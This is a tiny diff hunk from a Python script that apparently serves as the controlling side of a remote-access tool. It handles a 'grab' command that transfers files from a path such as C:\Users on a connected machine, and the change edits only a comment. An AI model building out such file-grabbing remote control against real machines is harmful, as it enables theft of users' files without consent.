@@ -34,7 +34,7 @@ def connect():
             break
             
         elif 'grab' in command:
-            #grab*C:\Users\file-name
+            # grab*C:\Users\file-name.extension
             transfer(conn,command)
 
         else:
